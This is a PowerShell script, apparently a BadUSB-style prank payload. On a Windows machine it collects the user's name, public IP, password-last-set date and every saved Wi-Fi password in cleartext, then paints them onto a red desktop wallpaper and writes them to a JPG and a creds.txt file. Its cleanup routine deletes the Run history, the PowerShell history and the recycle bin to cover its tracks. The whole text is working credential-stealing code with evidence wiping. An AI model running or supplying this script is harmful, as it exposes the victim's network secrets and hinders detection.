$hiddenMessage = "`n`nYou should `ntake care about your `nwindows sessions `n While leaving your computer"
$ImageName = "dont-let-your-computer-alone"
$TempInfoFile = "$Env:temp\foo.txt"
$TempImgFile = "$env:temp\foo.jpg"

if (Test-Path $TempInfoFile) { Remove-Item $TempInfoFile }

# AUTH_INFO
function Get-Name {
    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
        $fullName = ("$fullName").TrimStart("Full Name").Trim()
        if ([string]::IsNullOrEmpty($fullName)) { return $env:UserName }
        return $fullName
    } catch { return $env:UserName }
}

# NETWORK_INFO
function Get-PubIP {
    try { return (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -TimeoutSec 2).Content.Trim() }
    catch { return "Unknown" }
}

# PASS_INFO
function Get-Days_Set {
    try {
        $pls = net user $env:USERNAME | Select-String -Pattern "Password last"
        return ([string]$pls).Split(" ", 4)[-1].Trim()
    } catch { return "Not found" }
}

$fn = Get-Name
$PubIP = Get-PubIP
$pls = Get-Days_Set

"Hey $fn" > $TempInfoFile
"`nYour computer is not very secure" >> $TempInfoFile
"`nYour Public IP: $PubIP" >> $TempInfoFile
"`nPassword Last Set: $pls" >> $TempInfoFile

# WIFI_STEAL
$WLANProfileNames = @()
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
foreach($line in $Output) { $WLANProfileNames += (($line -split ":")[1]).Trim() }

if ($WLANProfileNames.Count -gt 0) {
    "`nW-Lan profiles: ===============================" >> $TempInfoFile
    foreach($name in $WLANProfileNames) {
        try {
            $pass = (((netsh.exe wlan show profiles name="$name" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
            "Profile: $name | Pass: $pass" >> $TempInfoFile
        } catch { "Profile: $name | Pass: Not Stored" >> $TempInfoFile }
    }
}

$content = Get-Content $TempInfoFile -Raw

# DISPLAY_METRICS
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118)
$h = [PInvoke]::GetDeviceCaps($hdc, 117)

# DRAWING_ENGINE
Add-Type -AssemblyName System.Drawing
$bmp = new-object System.Drawing.Bitmap $w, $h
$graphics = [System.Drawing.Graphics]::FromImage($bmp)

$graphics.Clear([System.Drawing.Color]::Red)
$font = new-object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
$brush = [System.Drawing.Brushes]::White

$textSize = $graphics.MeasureString($content, $font)
$x = ($w - $textSize.Width) / 2
$y = ($h - $textSize.Height) / 2

$graphics.DrawString($content, $font, $brush, $x, $y)

$graphics.Dispose()
$bmp.Save($TempImgFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$bmp.Dispose()

# FILE_PACKING
$hiddenMessage >> $TempInfoFile
cmd.exe /c copy /b "$TempImgFile" + "$TempInfoFile" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
copy $TempInfoFile "$Env:USERPROFILE\creds.txt"
Remove-Item $TempInfoFile, $TempImgFile -Force -ErrorAction SilentlyContinue

# WALLPAPER_CORE
Function Set-WallPaper {
    param ([string]$Image)
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    public class Params {
        [DllImport("User32.dll",CharSet=CharSet.Unicode)]
        public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
    }
"@
    if (-not ([System.Management.Automation.PSTypeName]'Params').Type) { Add-Type -TypeDefinition $code }
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "0"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
    [Params]::SystemParametersInfo(0x0014, 0, $Image, 0x01 -bor 0x02)
}

# CLEANUP
function clean-exfil {
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    if (Get-PSreadlineOption) { Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue }
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg"
clean-exfil
